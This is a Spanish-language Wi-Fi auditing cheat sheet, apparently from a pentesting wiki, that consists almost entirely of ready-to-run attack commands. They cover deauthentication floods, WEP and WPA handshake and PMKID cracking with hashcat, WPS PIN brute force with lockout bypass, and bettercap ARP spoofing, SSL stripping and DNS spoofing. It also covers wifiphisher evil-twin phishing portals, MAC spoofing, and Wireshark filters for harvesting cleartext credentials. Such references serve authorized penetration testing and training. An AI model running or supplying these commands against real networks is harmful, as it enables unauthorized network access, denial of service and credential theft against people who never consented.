---
icon: wifi
---

# Herramientas

### Suite Aircrack-ng

La suite principal para auditorías Wi-Fi. Incluye todas las herramientas necesarias para captura, inyección y cracking.

#### airmon-ng — Gestión del modo monitor

```bash
# Ver interfaces disponibles
airmon-ng

# Verificar procesos conflictivos
airmon-ng check

# Matar procesos conflictivos
airmon-ng check kill

# Activar modo monitor
airmon-ng start wlan0
airmon-ng start wlan0 6    # En canal específico

# Desactivar modo monitor
airmon-ng stop wlan0mon

# Con driver específico (forzar)
airmon-ng start wlan0 --driver rtl8812au
```

#### airodump-ng — Captura de tráfico y reconocimiento

```bash
# Escaneo general
airodump-ng wlan0mon

# Solo 2.4 GHz
airodump-ng wlan0mon --band bg

# Solo 5 GHz
airodump-ng wlan0mon --band a

# Ambas bandas
airodump-ng wlan0mon --band abg

# Focalizado en un AP
airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6 -w captura

# Guardar en múltiples formatos
airodump-ng wlan0mon -w salida --output-format csv,pcap,kismet,netxml

# Solo guardar IVs (para WEP)
airodump-ng wlan0mon --bssid BSSID --channel CH --ivs -w wep_ivs

# Mostrar fabricante de la MAC
airodump-ng wlan0mon --manufacturer

# Mostrar solo redes WPA2
airodump-ng wlan0mon | grep WPA2
```

#### aireplay-ng — Inyección de paquetes

```bash
# Test de inyección (verificar que funciona)
aireplay-ng -9 wlan0mon
aireplay-ng -9 -a BSSID wlan0mon    # Con AP específico

# Deauthentication
aireplay-ng -0 N -a BSSID_AP wlan0mon              # N deauths a todos
aireplay-ng -0 N -a BSSID_AP -c MAC_CLIENTE wlan0mon # N deauths a cliente específico
aireplay-ng -0 0 -a BSSID_AP wlan0mon              # Infinito

# Fake Authentication (para ataques WEP)
aireplay-ng -1 0 -a BSSID_AP wlan0mon              # Asociación básica
aireplay-ng -1 6000 -o 1 -q 10 -a BSSID wlan0mon  # Mantener asociación

# ARP Replay (generar IVs para WEP)
aireplay-ng -3 -b BSSID_AP wlan0mon

# Chopchop attack (WEP)
aireplay-ng -4 -b BSSID_AP wlan0mon

# Fragmentation attack (WEP)
aireplay-ng -5 -b BSSID_AP wlan0mon

# Interactive packet replay
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b BSSID wlan0mon
```

#### aircrack-ng — Cracking de contraseñas

```bash
# Crackear WPA/WPA2 con diccionario
aircrack-ng captura-01.cap -w /usr/share/wordlists/rockyou.txt

# Especificar BSSID si hay varios handshakes
aircrack-ng captura-01.cap -w wordlist.txt -b AA:BB:CC:DD:EE:FF

# Crackear WEP con IVs
aircrack-ng wep_ivs-01.ivs
aircrack-ng -n 128 wep_ivs-01.ivs    # WEP 128 bits

# Crackear WEP con probabilidad estadística
aircrack-ng -f 4 captura-01.cap     # Fudge factor

# Verificar que hay handshake (sin crackear)
aircrack-ng captura-01.cap
```

#### airdecap-ng — Descifrado de capturas

```bash
# Descifrar captura WPA con contraseña conocida
airdecap-ng -e "NombreRed" -p "ContraseñaRed" captura-01.cap
# Genera: captura-01-dec.cap

# Descifrar WEP con clave conocida
airdecap-ng -w CLAVE_WEP captura-01.cap

# Eliminar cabeceras 802.11 (convertir a Ethernet)
airdecap-ng -l captura-01.cap
```

#### airbase-ng — Crear AP (uso básico)

```bash
# Crear AP abierto básico
airbase-ng -e "MiAP" -c 6 wlan0mon

# Crear AP con WPA2
airbase-ng -e "MiAP" -c 6 -z 4 wlan0mon
# -z 4 → CCMP (WPA2)

# La interfaz del AP se crea automáticamente como at0
# Configurar at0 con IP y DHCP para dar internet
ip addr add 192.168.1.1/24 dev at0
ip link set at0 up
dnsmasq --interface=at0 --dhcp-range=192.168.1.2,192.168.1.30
```

### Suite hcxtools

Suite moderna para captura y procesamiento de handshakes WPA y PMKID.

#### hcxdumptool — Captura moderna

```bash
# Captura básica (PMKID + handshakes)
hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=3

# Con filtro de AP específico
echo "aabbccddeeff" > target_ap.txt  # BSSID sin puntos
hcxdumptool -i wlan0mon \
    -o captura.pcapng \
    --enable_status=3 \
    --filterlist_ap=target_ap.txt \
    --filtermode=2

# Captura en canal específico
hcxdumptool -i wlan0mon -o captura.pcapng --channel=6 --enable_status=3

# Scan de canales automático
hcxdumptool -i wlan0mon -o captura.pcapng --rcascan --enable_status=3

# Solo 5 GHz
hcxdumptool -i wlan0mon -o captura.pcapng --band=a --enable_status=3

# Con filtro de clientes específicos
echo "112233445566" > target_clients.txt
hcxdumptool -i wlan0mon -o captura.pcapng \
    --filterlist_sta=target_clients.txt \
    --filtermode=2
```

#### hcxpcapngtool — Procesamiento y extracción

```bash
# Extraer hashes en formato hashcat 22000
hcxpcapngtool -o hashes.22000 captura.pcapng

# Extraer solo PMKIDs
hcxpcapngtool -o hashes.22000 captura.pcapng
grep "WPA\*01\*" hashes.22000 > solo_pmkid.22000

# Extraer información adicional
hcxpcapngtool captura.pcapng \
    -E essids.txt \         # Lista de ESSIDs capturados
    -I identidades.txt \    # Identidades EAP
    -U usuarios.txt         # Usuarios

# Generar wordlist desde los ESSIDs capturados
hcxpcapngtool captura.pcapng --essid-wordlist=essid_wordlist.txt

# Ver estadísticas del archivo
hcxpcapngtool captura.pcapng

# Filtrar por BSSID específico
hcxpcapngtool captura.pcapng -o filtered.22000 \
    --filterlist_ap=target_ap.txt --filtermode=2
```

### Reaver & Bully — WPS

```bash
# Reaver — WPS Pixie Dust
reaver -i wlan0mon -b BSSID -K 1 -vvv

# Reaver — Fuerza bruta WPS
reaver -i wlan0mon -b BSSID -vvv
reaver -i wlan0mon -b BSSID -d 5 -r 3:15 -vvv    # Con delays
reaver -i wlan0mon -b BSSID -c 6 -vvv             # Canal específico
reaver -i wlan0mon -b BSSID -p 1234 -vvv          # PIN inicial
reaver -i wlan0mon -b BSSID -L -vvv               # Ignorar lockout

# Bully — alternativa
bully wlan0mon -b BSSID -d -v 3        # Pixie Dust
bully wlan0mon -b BSSID -v 3           # Fuerza bruta
bully wlan0mon -b BSSID -c 6 -v 3     # Canal específico

# Wash — escaneo de WPS
wash -i wlan0mon
wash -i wlan0mon -5                    # 5 GHz
wash -i wlan0mon -c 6                  # Canal específico
wash -i wlan0mon -o wps_scan.csv       # Guardar resultados
```

### Hashcat — Cracking con GPU

```bash
# Modos para Wi-Fi:
# -m 22000 → WPA-PBKDF2-PMKID+EAPOL (formato moderno)
# -m 2500  → WPA/WPA2 .hccapx (legacy)
# -m 5600  → NetNTLMv2 (MSCHAPv2 de Enterprise)
# -m 16800 → WPA-PMKID-PBKDF2 (PMKID solo)

# Por diccionario
hashcat -m 22000 hashes.22000 rockyou.txt

# Con reglas
hashcat -m 22000 hashes.22000 rockyou.txt -r rules/best64.rule
hashcat -m 22000 hashes.22000 rockyou.txt -r rules/dive.rule

# Por máscara (8 dígitos)
hashcat -m 22000 hashes.22000 -a 3 ?d?d?d?d?d?d?d?d

# Combinación de diccionarios
hashcat -m 22000 hashes.22000 -a 1 dict1.txt dict2.txt

# Ver contraseña encontrada
hashcat -m 22000 hashes.22000 --show

# Benchmark (velocidad de la GPU)
hashcat -m 22000 -b

# Rendimiento esperado (GTX 1060):
# WPA2: ~400.000 H/s
# Una pasada de rockyou (14M entradas): ~35 segundos
# 8 dígitos (100M): ~250 segundos
```

### Bettercap — MITM todo en uno

```bash
# Instalación
apt install bettercap
# o
go install github.com/bettercap/bettercap@latest

# Iniciar en interfaz Wi-Fi conectada
bettercap -iface wlan0

# Comandos principales en la consola interactiva:
help                              # Lista de módulos
net.probe on                      # Descubrir hosts
net.show                          # Ver hosts detectados
set arp.spoof.targets IP          # Objetivo ARP spoof
arp.spoof on                      # Iniciar ARP spoofing
net.sniff on                      # Capturar tráfico
set net.sniff.output captura.pcap # Guardar captura
set https.proxy.sslstrip true     # SSL stripping
https.proxy on                    # Proxy HTTPS
set dns.spoof.domains target.com  # Spoof de dominio
set dns.spoof.address 192.168.1.2 # IP destino DNS
dns.spoof on                      # DNS spoofing
wifi.recon on                     # Reconocimiento Wi-Fi
wifi.show                         # Ver redes detectadas
wifi.deauth BSSID                 # Deauth a un AP
events.stream on                  # Ver eventos en tiempo real

# Caplet (script de automatización)
cat > mitm.cap << EOF
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
set https.proxy.sslstrip true
https.proxy on
net.sniff on
EOF
bettercap -iface wlan0 -caplet mitm.cap
```

### Wifiphisher — Evil Twin automatizado

```bash
# Instalación
pip3 install wifiphisher

# Seleccionar red interactivamente
sudo wifiphisher

# Con red específica
sudo wifiphisher --essid "NombreRed" \
    -phishingscenario firmware-upgrade

# Templates disponibles
sudo wifiphisher --list-scenarios

# Con interfaces específicas
sudo wifiphisher -aI wlan0 -jI wlan1 \
    --essid "NombreRed" \
    -phishingscenario oauth-login

# Sin internet (solo portal, sin NAT)
sudo wifiphisher --essid "NombreRed" \
    -phishingscenario wifi-connect \
    --no-internet
```

### Airgeddon — Suite completa interactiva

```bash
# Instalación
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
bash airgeddon.sh

# Menú principal:
# 2 → Poner interfaz en modo monitor
# 3 → Volver a modo managed
# 4 → Ataques DoS (deauth)
# 5 → Evil Twin attacks
# 6 → WPS attacks (Pixie Dust + Brute Force)
# 7 → WEP attacks
# 8 → WPA/WPA2 attacks (handshake + cracking)
# 9 → Ataques enterprise
# 10 → Offline WPA/WPA2 decrypt

# Evil Twin con portal cautivo:
# 5 → Evil Twin attacks
# 9 → WPA/WPA2 Evil Twin AP attack with captive portal

# WPS Pixie Dust:
# 6 → WPS attacks
# 8 → Pixie Dust attack
```

### Macchanger — Cambio de MAC

```bash
# Ver MAC actual
macchanger -s wlan0

# MAC completamente aleatoria
macchanger -r wlan0

# MAC de un fabricante aleatorio
macchanger -A wlan0

# MAC específica
macchanger -m AA:BB:CC:DD:EE:FF wlan0

# Restaurar MAC original
macchanger -p wlan0

# Cambiar MAC con la interfaz activa (modo monitor)
ip link set wlan0mon down
macchanger -r wlan0mon
ip link set wlan0mon up
```

### Wireshark — Filtros esenciales para Wi-Fi

```bash
# Iniciar con interfaz en modo monitor
wireshark -i wlan0mon -k

# Filtros de captura (BPF — aplican durante la captura):
# Solo tramas de un AP:
wlan host AA:BB:CC:DD:EE:FF

# Solo tramas de management:
wlan.fc.type == 0

# Filtros de visualización (aplican al análisis):

# Handshakes WPA
eapol

# Beacons (anuncios de AP)
wlan.fc.type_subtype == 0x08

# Probe requests (clientes buscando redes)
wlan.fc.type_subtype == 0x04

# Deauth frames
wlan.fc.type_subtype == 0x0c

# Solo tráfico HTTP
http

# POST con posibles credenciales
http.request.method == "POST"

# Ver credenciales en claro
http contains "password"

# ARP (para ver ARP spoofing)
arp

# Ver todo excepto beacons (reduce ruido)
!wlan.fc.type_subtype == 0x08
```

### Referencia rápida de comandos

```bash
# RECONOCIMIENTO
airmon-ng check kill && airmon-ng start wlan0
airodump-ng wlan0mon
wash -i wlan0mon

# HANDSHAKE
airodump-ng wlan0mon --bssid BSSID --channel CH -w captura
aireplay-ng -0 5 -a BSSID wlan0mon

# PMKID
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=3
hcxpcapngtool -o hashes.22000 pmkid.pcapng

# CRACKING
hashcat -m 22000 hashes.22000 rockyou.txt -r rules/best64.rule
hashcat -m 22000 hashes.22000 -a 3 ?d?d?d?d?d?d?d?d

# WPS
reaver -i wlan0mon -b BSSID -K 1 -vvv    # Pixie Dust
reaver -i wlan0mon -b BSSID -d 5 -vvv    # Brute force

# EVIL TWIN
airgeddon.sh   # Menú interactivo
wifiphisher --essid "Target" -phishingscenario firmware-upgrade

# MITM
bettercap -iface wlan0
# → arp.spoof on, net.sniff on, https.proxy on
```

> El orden recomendado de herramientas para cualquier auditoría Wi-Fi: `wash` para identificar WPS → `hcxdumptool` para PMKID → `aircrack-ng/airodump-ng` para handshake → `hashcat` para cracking. Airgeddon automatiza todo esto en un menú interactivo.

> hcxdumptool reemplaza a airodump-ng para la captura moderna porque captura PMKID y EAPOL simultáneamente, hace saltos de canal automáticos y genera el formato `.pcapng` que hcxpcapngtool convierte directamente al formato hashcat.

> Mantener siempre aircrack-ng y hcxtools actualizados — el formato `.22000` de hashcat y las capacidades de hcxdumptool evolucionan frecuentemente y versiones antiguas pueden no ser compatibles entre sí.
